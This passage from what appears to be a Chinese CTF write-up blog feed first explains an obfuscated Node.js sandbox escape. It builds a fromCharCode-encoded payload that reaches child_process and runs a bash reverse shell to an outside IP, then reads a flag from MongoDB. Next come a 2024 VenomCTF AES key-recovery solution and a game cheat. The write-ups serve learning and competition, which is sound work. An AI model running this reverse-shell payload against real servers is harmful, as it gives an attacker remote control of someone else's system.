punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">38</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>with(String)</code> : 创建一个作用域，可直接引用 JavaScript 内置的 String 对象的方法和属性。</p>\n<p><code>String.fromCharCode</code>  把指定的 Unicode 值转换成字符串，使用数字代替字符 payload 长度会更短， <code>节省空间/代码混淆</code></p>\n<p>定义函数 f <code>f=fromCharCode</code></p>\n<p><code>with(constructor('return process')</code> : 调用  <code>fromCharCode</code>  方法生成了一串字符，并将其作为参数传递给  <code>constructor</code> ，创建了一个新的对象。</p>\n<p><code>with(mainModule)</code> :  <code>mainModule</code>  对象引入作用域，是一个特殊对象，代表当前运行的主模块</p>\n<p><code>with(require('child_process'))</code> :  引入模块 <code>child_process</code></p>\n<p><code>exec(bash -c &quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;b&quot;)</code> ： <code>0&gt;&amp;b</code>  防止与其他正在运行的命令产生冲突</p>\n<p>将 <code>/ip/port</code>  部分进行 <code>ascii 10进制编码</code> 后，连接服务器端口 ssh</p>\n<p>payload 中 <code>0&gt;&amp;1</code>  要根据混淆的表达定义进行重构，比如此处 <code>ord(1)=49即为a</code></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>f<span class=\"token operator\">=</span>fromCharCode<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>constructor<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span><span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span>r<span class=\"token operator\">=</span><span class=\"token number\">114</span><span class=\"token punctuation\">,</span>e<span class=\"token operator\">=</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span>t<span class=\"token operator\">=</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">117</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">110</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span>p<span class=\"token operator\">=</span><span class=\"token number\">112</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span>c<span class=\"token operator\">=</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>s<span class=\"token operator\">=</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>mainModule<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>h<span class=\"token operator\">=</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span><span class=\"token number\">105</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token number\">95</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>h<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>h<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">105</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">38</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span><span class=\"token number\">118</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span>a<span class=\"token operator\">=</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">51</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">55</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">38</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>以 MongoDB 为突破口，查看信息</p>\n<p><code>mongo</code>  连接 MongoDB 数据库服务器，执行操作</p>\n<p><code>show databases</code>  列出当前 MongoDB 服务器上所有的数据库</p>\n<p><code>use secret</code>  告诉 MongoDB 客户端要使用的数据库是 &quot;secret&quot;</p>\n<p><code>show tables / show collections</code>  列出当前数据库中的所有集合</p>\n<p><code>db.flag.find()</code>  在 &quot;flag&quot; 集合中查找所有文档</p>\n<p>找到 <code>flag&#123;df184567-15cd-4876-b283-256ccc9161de&#125;</code></p>\n",
            "tags": [
                "CTF赛题",
                "CTF_WriteUp"
            ]
        },
        {
            "id": "http://yoursite.com/CTF-WriteUp/2024%20VenomCTF/",
            "url": "http://yoursite.com/CTF-WriteUp/2024%20VenomCTF/",
            "title": "2024 VenomCTF",
            "date_published": "2024-03-18T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h2 id=\"狂飙\"><a class=\"anchor\" href=\"#狂飙\">#</a> 狂飙</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>key <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>key <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n<span class=\"token operator\">=</span>m <span class=\"token operator\">%</span> key</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># n=>key</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m <span class=\"token operator\">%</span> key <span class=\"token operator\">=</span> n</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token string\">b'\\x00'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>iv <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 8byte 异或</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>enc_flag <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#103560843006078708944833658339172896192389513625588</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#b'\\xfc\\x87\\xcb\\x8e\\x9d\\x1a\\x17\\x86\\xd9~\\x16)\\xbfU\\x98D\\xfe\\x8f\\xde\\x9c\\xb0\\xd1\\x9e\\xe7\\xa7\\xefiY\\x95C\\x14\\x13C@j1\\x9d\\x08\\xd9\\xe7W>F2\\x96cm\\xeb'</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#b'UN\\x1d\\xe2r&lt;\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86'</span></pre></td></tr></table></figure><p><strong>AES 解密</strong>：创建 AES 解密器，调用 <code>decrypt</code>  方法</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>aes_dec <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span> iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dec <span class=\"token operator\">=</span> aes_dec<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>补充</strong>：os.urandom () 函数生成的字节串是不可打印的，只能用于加密、哈希、签名等应用。在使用 os.urandom () 函数生成随机数时，可以将生成的字节串转换为整数，然后根据需要进行取模等操作。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>enc_flag <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>iv <span class=\"token operator\">=</span> <span class=\"token string\">b'UN\\x1d\\xe2r&lt;\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># print(iv)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>max_num <span class=\"token operator\">=</span> <span class=\"token number\">100</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>rand_int <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">.</span>from_bytes<span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">,</span> byteorder<span class=\"token operator\">=</span><span class=\"token string\">'big'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> max_num <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rand_int<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>言归正传，这道题 <code>已知iv,cipher</code> ，所以解密 <code>关键在key</code></p>\n<ul>\n<li>key 是 24 位随机数</li>\n<li><code>n=m % key</code></li>\n<li>已知 m,n</li>\n</ul>\n<p><strong>思路</strong>：key 是 m-n 的一个因子，通过大素数分解可以求得所有可能 http://www.factordb.com/index.php</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">8800751370.</span><span class=\"token punctuation\">.</span><span class=\"token number\">.61</span><span class=\"token operator\">&lt;</span><span class=\"token number\">77</span><span class=\"token operator\">></span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span> · <span class=\"token number\">37</span> · <span class=\"token number\">439</span> · <span class=\"token number\">3939851</span> · <span class=\"token number\">265898280367</span><span class=\"token operator\">&lt;</span><span class=\"token number\">12</span><span class=\"token operator\">></span> · <span class=\"token number\">5036645362649</span><span class=\"token operator\">&lt;</span><span class=\"token number\">13</span><span class=\"token operator\">></span> · <span class=\"token number\">342291058100503482469327892079792475478873</span><span class=\"token operator\">&lt;</span><span class=\"token number\">42</span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>通过 <code>combinations</code>  得到 <code>因子组合成key的所有可能</code> ，再逐个尝试解密</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> combinations</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">103560843006078708944833658339172896192389513625588</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>enc_flag <span class=\"token operator\">=</span> <span class=\"token string\">b'\\xfc\\x87\\xcb\\x8e\\x9d\\x1a\\x17\\x86\\xd9~\\x16)\\xbfU\\x98D\\xfe\\x8f\\xde\\x9c\\xb0\\xd1\\x9e\\xe7\\xa7\\xefiY\\x95C\\x14\\x13C@j1\\x9d\\x08\\xd9\\xe7W>F2\\x96cm\\xeb'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>iv <span class=\"token operator\">=</span> <span class=\"token string\">b'UN\\x1d\\xe2r&lt;\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>factor <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">439</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3939851</span><span class=\"token punctuation\">,</span> <span class=\"token number\">265898280367</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5036645362649</span><span class=\"token punctuation\">,</span> <span class=\"token number\">342291058100503482469327892079792475478873</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>l <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>o <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>key_cand <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_key</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">for</span> r <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token comment\"># 生成所有可能的因子组合序列</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">for</span> comb <span class=\"token keyword\">in</span> combinations<span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> comb<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token comment\"># 每个组合内所有因子乘积为一个大因子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                key <span class=\"token operator\">*=</span> num</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token comment\"># 除数大于余数</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token keyword\">if</span> key <span class=\"token operator\">></span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                    <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span> m <span class=\"token operator\">%</span> key<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                        key_cand<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>key <span class=\"token operator\">=</span> find_key<span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">for</span> key <span class=\"token keyword\">in</span> key_cand<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    key<span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        aes_dec <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span> iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        dec <span class=\"token operator\">=</span> aes_dec<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        dec <span class=\"token operator\">=</span> dec<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr></table></figure><p><strong>官方题解</strong>：通过遍历所有除数获得 key 的所有可能， <code>long_to_bytes(i,24)</code>  强制获得 24 位密钥，就不需要错误处理的环节了，最后 <code>if ... in ...</code>  找 flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span><span class=\"token number\">103560843006078708944833658339172896192389513625588</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m<span class=\"token operator\">=</span><span class=\"token number\">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>key<span class=\"token operator\">=</span>m<span class=\"token operator\">-</span>n</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#88007513702424243702066490746035974298749130602173983187260701596410698439661</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>enc<span class=\"token operator\">=</span><span class=\"token string\">b'\\xfc\\x87\\xcb\\x8e\\x9d\\x1a\\x17\\x86\\xd9~\\x16)\\xbfU\\x98D\\xfe\\x8f\\xde\\x9c\\xb0\\xd1\\x9e\\xe7\\xa7\\xefiY\\x95C\\x14\\x13C@j1\\x9d\\x08\\xd9\\xe7W>F2\\x96cm\\xeb'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>iv<span class=\"token operator\">=</span><span class=\"token string\">b'UN\\x1d\\xe2r&lt;\\x1db\\x00\\xdb\\x9a\\x84\\x1e\\x82\\xf0\\x86'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> key<span class=\"token punctuation\">.</span>divisors<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    i<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    aes<span class=\"token operator\">=</span>AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    flag<span class=\"token operator\">=</span>aes<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'flag&#123;'</span> <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h1>\n<h2 id=\"checkin\"><a class=\"anchor\" href=\"#checkin\">#</a> checkin</h2>\n<p>提示：T-Rex Run!</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Runner</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">gameOver</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Runner<span class=\"token punctuation\">.</span>instance_<span class=\"token punctuation\">.</span>distanceRan <span class=\"token operator\">=</span> <span class=\"token number\">114514</span> <span class=\"token operator\">/</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Runner<span class=\"token punctuation\">.</span>instance_<span class=\"token punctuation\">.</span>distanceMeter<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span><span class=\"token constant\">COEFFICIENT</span></pre></td></tr></table></figure><h1 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMyMDEwL2FydGljbGUvZGV0YWlscy8xMjE3MjU5ODk=\">二进制安全学习路线</span></p>\n<h2 id=\"ezhp_code\"><a class=\"anchor\" href=\"#ezhp_code\">#</a> ezhp_code</h2>\n<p><span 